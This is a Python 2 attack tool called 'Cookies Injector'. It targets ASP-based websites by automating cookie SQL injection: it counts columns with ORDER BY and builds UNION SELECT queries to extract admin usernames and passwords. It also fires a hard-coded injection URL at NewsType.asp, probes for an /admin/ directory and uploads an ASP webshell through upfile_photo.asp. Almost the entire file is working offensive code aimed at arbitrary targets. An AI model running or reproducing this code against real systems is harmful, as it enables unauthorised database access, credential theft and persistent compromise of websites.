import requests
import difflib
import sys
import argparse
import urlparse
from lxml import etree
import logging

def different(str1,str2):
  diffstr = difflib.Differ()
  num = [] 
  sql_result = ''
  difflist = list(diffstr.compare(str1,str2))
  return difflist

def union_str(order_by_number):
  union_str = ' union select 1'
  for i in range(2,order_by_number+1):
    union_str += ',' + str(i)
  union_str += ' from admin'
  print green_start + '[+]union_select_str:' + union_str + green_end
  return union_str

def union_str_select (union_str,num):
  try:
    colmus = ['username','password']
    flag = 0 
    index = 0
    for i in num:
      if i != flag:
        union_str = union_str.replace(i,colmus[index],1)
        flag = i
	index += 1
      if index == 2:
        return union_str
  except Exception as e:
    print e.message
    print red_start + '[-]Cookie Inject Failed' + red_end
    exit()
 
def Get_order_by_number(url_base,url_param,url_value):
  for i in range(1,50):
   url_value1 = url_value + ' order by ' + str(i)
   mycookies = {url_param : url_value1}
   print '[+]order_by_cookies:  ' + url_param + '=' + url_value1
   sql_r = requests.get(url_base,cookies = mycookies)
   sql_len = len(sql_r.content)
   if sql_len != corrent_len:
     order_by_number = i - 1
     return order_by_number

def Find_different(difflist):
  sql_result = ''
  num = [] 
  for flag in difflist:
    if '+' in flag:
      flag = flag.split('+')[1]
      flag = flag.strip()
      sql_result += flag   
  for i in sql_result:
    if i.isdigit():
      num.append(i)
  return num

def Test_0_day(url_parse):
  url_0day = 'NewsType.asp?SmallClass=\' union select 0,username%2BCHR(124)%2Bpassword'
  url_0day += ',2,3,4,5,6,7,8,9 from admin union select * from news where 1=2 and \'\'=\''
  url_0day = url_parse.scheme + '://' + url_parse.netloc + '/' + url_0day
  print '[+]Test_0day_URL:' + url_0day
  r = requests.get(url_0day)
  if r.status_code == 200:
    print green_start + '[+]0_day vulnerable' + green_end
    logger.info('[+]0_day vulnerable')
    select = etree.HTML(r.content)
    informations = select.xpath('//body/table/tr[1]/td[2]/span/a/text()')
    print green_start + '[+]informations:' + str(informations) + green_end
  else:
    print red_start + '[-]0_day Invulnerable' + red_end
    logger.info('[-]0_day Invulnerable')

def check_inject(url_base,url_param,url_value):
  mycookies = {url_param : url_value}
  cookies_r = requests.get(url_base,cookies = mycookies)
  r = requests.get(url_base + '?' + url_param + '=' + url_value)
  if len(r.content) != len(cookies_r.content):
    return False
  mycookies = {url_param : url_value + ' and 1=1'}
  r = requests.get(url_base,cookies = mycookies)
  mycookies = {url_param : url_value + ' and 1=2'}
  cookies_r = requests.get(url_base,cookies = mycookies)
  if len(r.content) == len(cookies_r.content):
    return False
  else:
    return True

def web_dictory(urlparse):
  url = urlparse.netloc
  url = url_parse.scheme + '://' + url_parse.netloc + '/' + 'admin/'
  r = requests.get(url)
  if r.status_code == 200:
    print green_start + 'Found:' + url + green_end
    logger.info('Found:' + url)
  else:
    print red_start + 'NotFound:' + url + red_end

def upload_shell(upload_path,mycookies):
  url = urlparse.urlparse(upload_path)
  admin_url = 'http://' + url.netloc + '/admin/default.asp'
  if mycookies == {}:
    cookies = raw_input('Enter the Cookies:')
    while cookies == '' or '=' not in cookies:
      cookies = raw_input('Enter the Cookies[Ctrl+C to quit]:')
    try:
      cookies_param = cookies.split('=')[0]
      cookies_value = cookies.split('=')[1]
      mycookies = {cookies_param : cookies_value}
    except:
      print red_start + '[-]Cookie Error' + red_end
      logger.info('[-]Cookie Error')
      exit()
  print green_start + '[+]Try to use this cookies to access the /admin/' + green_end
  r = requests.get(admin_url,cookies = mycookies,allow_redirects=False)
  if r.status_code == 302:
    print red_start + '[-]Cookies Invalnrable' + red_end
    logger.info('[-]Cookies Invalnrable')
    exit()
  r = requests.get(upload_path,cookies = mycookies)
  if r.status_code == 200:
    files = {'content' : open('test.jpg','rb'),'content1' : open('test.asp ','rb')}
    headers = {'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0'}
    data = {'submit' : 'submit','PhotoUrlID' : '0'}
    r = requests.post(upload_path,files = files,cookies = mycookies,headers = headers,data = data)
    print green_start + '[+]Upload Webshell Successful' + green_end
    print r.content
    logger.info('[+]Upload Webshell Successful')
    logger.info(r.content)
    exit()
  else:
    print red_start + '[-]Upload_Path Don\'t Exists' + red_end
    upload_path = raw_input('[+]Please Enter The Upload_Path:')
    upload_shell(upload_path,mycookies)

if __name__ == '__main__':
  red_start = '\033[6;31;40m'
  red_end = '\033[0m'
  green_start = '\033[6;32;40m'
  green_end = '\033[0m'
  banner = green_start + '''                		    
   ========================================================
                    _    _        _        _           _   
     ___ ___   ___ | | _(_) ___  (_)_ __  (_) ___  ___| |_ 
    / __/ _ \ / _ \| |/ / |/ _ \ | | '_ \ | |/ _ \/ __| __|
   | (_| (_) | (_) |   <| |  __/ | | | | || |  __/ (__| |_ 
    \___\___/ \___/|_|\_\_|\___| |_|_| |_|/ |\___|\___|\__|
                                        |__/               
   ========================================================
   ''' + green_end				
  print banner
  logger = logging.getLogger(__name__)
  logger.setLevel(level = logging.INFO)
  handler = logging.FileHandler("log.txt")
  handler.setLevel(logging.INFO)
  formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
  handler.setFormatter(formatter)
  logger.addHandler(handler)
  logger.info('=================================')
  parser = argparse.ArgumentParser(prog = 'Cookies Injector',description = 'Cookies Injector')
  parser.add_argument("-u","--url",type = str,dest = 'url',help = "Target URL")
  parser.add_argument("-m","--mode",type = int ,dest = 'mode',help = "Choose Mode:1.Just Cookies Inject 2.Try to exploit 0_day 3.Try to Upload_shell 4.ALL")
  args = parser.parse_args()
  if args.url == None or args.mode == None or args.mode > 4 or args.mode <= 0:
    parser.print_help()
    exit()
  url = args.url
  try:
    url_parse = urlparse.urlparse(url)
  except:
    print 'URL Error'
    sys.exit()
  flag = args.mode
  mycookies = {}
  print '--------------------------'
  print 'Target_Host:' + url
  print 'Mode : ' + str(args.mode)
  print '--------------------------'
  logger.info('Targer_host:' + url + '    Mode:' + str(args.mode))
  url_base = url.split('?')[0]
  url_param = url.split('?')[1].split('=')[0]
  url_value = url.split('?')[1].split('=')[1]
  print '---------------------------'
  print green_start + '[+]url_base:' + url_base + green_end
  print green_start + '[+]url_param:' + url_param + green_end
  print green_start + '[+]url_value:' + url_value + green_end
  if flag != 1:
    Test_0_day(url_parse)
  print '---------------------------'
  web_dictory(url_parse)
  print '---------------------------'
  url_value_ = url_value
  r = requests.get(url)
  corrent_len = len(r.content)
  if check_inject(url_base,url_param,url_value):
    print green_start + '[+]Cookie Inject Vulnerable' + green_end
    logger.info('[+]Cookie Inject Vulnerable')
  else:
    print red_start + '[-]Cookie Inject Invulnerable' + red_end
    logger.info('[-]Cookie Inject Invulnerable')
    if flag == 3 or flag == 4:
      print green_start + '[+]Try to Upload_shell' + green_end
      logger.info('[+]Try to Upload_shell')
      upload_shell('http://' + url_parse.netloc + '/upfile_photo.asp',mycookies)
    else:
      exit()
  order_by_number = Get_order_by_number(url_base,url_param,url_value)
  union_str = union_str(order_by_number)
  url_value += ' and 1=2' + union_str
  mycookies = {url_param : url_value}
  sql_r_order = requests.get(url_base,cookies = mycookies)
  sql_r_order_len = len(sql_r_order.content)
  if corrent_len != sql_r_order_len:
    difflist = different(r.content,sql_r_order.content)
  num = Find_different(difflist)
  url_value = url_value_
  try:
    url_value = url_value + ' and 1=2' + union_str_select(union_str,num)
  except:
    print e.message()
    print red_start + '[-]Cookie Inject Failed' + red_end
    logger.info('[-]Cookie Inject Failed')
    exit()
  mycookies ={url_param : url_value}
  sql_r = requests.get(url_base,cookies = mycookies)
  print green_start + '[+]sql_cookies:' + url_param + '=' + url_value + green_end
  print green_start + '[+]Cookies Inject Successful' + green_end
  logger.info('[+]sql_cookies:' + url_param + '=' + url_value)
  logger.info('[+]Cookies Inject Successful')
  filename = url_parse.netloc + '-result.html'
  f = open(filename,'w')
  f.write(sql_r.content)
  print green_start + '[+]Dump to ' + filename + green_end
  logger.info('[+]Dump to ' + filename)
  f.close()
  if flag == 3 or flag == 4:
    mycookies = {}
    print green_start + '[+]Try to Upload_shell' + green_end
    logger.info('[+]Try to Upload_shell')
    upload_shell('http://' + url_parse.netloc + '/upfile_photo.asp',mycookies)
  else:
    exit()  
